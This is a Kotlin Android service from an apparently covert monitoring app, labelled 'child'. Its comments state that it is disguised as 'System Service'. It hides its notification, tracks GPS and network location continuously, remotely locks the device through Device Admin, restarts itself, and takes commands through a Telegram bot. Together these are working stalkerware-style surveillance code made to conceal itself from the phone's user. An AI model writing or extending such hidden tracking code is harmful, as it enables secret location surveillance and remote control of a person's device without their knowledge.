package com.divine.specter.child.service

import android.app.*
import android.app.admin.DevicePolicyManager
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.os.Build
import android.os.IBinder
import android.os.Bundle
import androidx.core.app.NotificationCompat
import com.divine.specter.child.ChildApplication
import com.divine.specter.child.sync.ChildSync
import com.divine.specter.child.telegram.TelegramBotClient
import com.divine.specter.child.telegram.TelegramConfig
import kotlinx.coroutines.*

/**
 * Foreground service for continuous sync.
 * Disguised as "System Service" in notification.
 */
class SyncService : Service(), LocationListener {

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var locationManager: LocationManager? = null
    private var lastLocation: Location? = null
    private var telegramBot: TelegramBotClient? = null

    companion object {
        const val CHANNEL_ID = "system_service"
        const val NOTIFICATION_ID = 1
    }

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        setupLocationProvider()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val notification = createNotification()

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(
                NOTIFICATION_ID,
                notification,
                ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION or
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
            )
        } else {
            startForeground(NOTIFICATION_ID, notification)
        }

        // Setup sync callbacks
        val sync = ChildApplication.instance.sync

        sync.getLocation = {
            lastLocation?.let {
                ChildSync.LocationData(it.latitude, it.longitude, it.accuracy)
            }
        }

        sync.onLocate = {
            // Request fresh location
            requestSingleLocation()
        }

        sync.onLock = {
            // Lock device (requires Device Admin)
            lockDevice()
        }

        sync.onBlockApp = { pkg ->
            // Block app via overlay or usage limits
            // This requires additional implementation
        }

        // Start sync and polling
        sync.startAll()

        // Start Telegram bot if configured
        if (TelegramConfig.isConfigured(this)) {
            val botToken = TelegramConfig.getBotToken(this)!!
            val chatId = TelegramConfig.getChatId(this)!!

            telegramBot = TelegramBotClient(this, botToken, chatId)
            telegramBot?.startPolling()
        }

        return START_STICKY
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "System Service",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                description = "Background system service"
                setShowBadge(false)
                lockscreenVisibility = Notification.VISIBILITY_SECRET
            }

            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }
    }

    private fun createNotification(): Notification {
        // Headless - no activity to open
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Service")
            .setContentText("Running")
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .build()
    }

    private fun setupLocationProvider() {
        try {
            locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager

            // Request location updates
            if (checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION)
                == android.content.pm.PackageManager.PERMISSION_GRANTED) {

                locationManager?.requestLocationUpdates(
                    LocationManager.GPS_PROVIDER,
                    60000L,  // 1 minute
                    50f,     // 50 meters
                    this
                )

                locationManager?.requestLocationUpdates(
                    LocationManager.NETWORK_PROVIDER,
                    60000L,
                    50f,
                    this
                )

                // Get last known
                lastLocation = locationManager?.getLastKnownLocation(LocationManager.GPS_PROVIDER)
                    ?: locationManager?.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
            }
        } catch (e: Exception) {
            // Location not available
        }
    }

    private fun requestSingleLocation() {
        try {
            if (checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION)
                == android.content.pm.PackageManager.PERMISSION_GRANTED) {

                locationManager?.getCurrentLocation(
                    LocationManager.GPS_PROVIDER,
                    null,
                    mainExecutor
                ) { location ->
                    if (location != null) {
                        lastLocation = location
                        // Trigger immediate sync
                        scope.launch {
                            ChildApplication.instance.sync.syncNow()
                        }
                    }
                }
            }
        } catch (e: Exception) {
            // Fallback
        }
    }

    private fun lockDevice() {
        try {
            val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            dpm.lockNow()
        } catch (e: Exception) {
            // Requires Device Admin permission
        }
    }

    override fun onLocationChanged(location: Location) {
        lastLocation = location
    }

    override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}
    override fun onProviderEnabled(provider: String) {}
    override fun onProviderDisabled(provider: String) {}

    override fun onDestroy() {
        super.onDestroy()
        scope.cancel()
        locationManager?.removeUpdates(this)
        ChildApplication.instance.sync.stopAll()
        telegramBot?.stopPolling()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
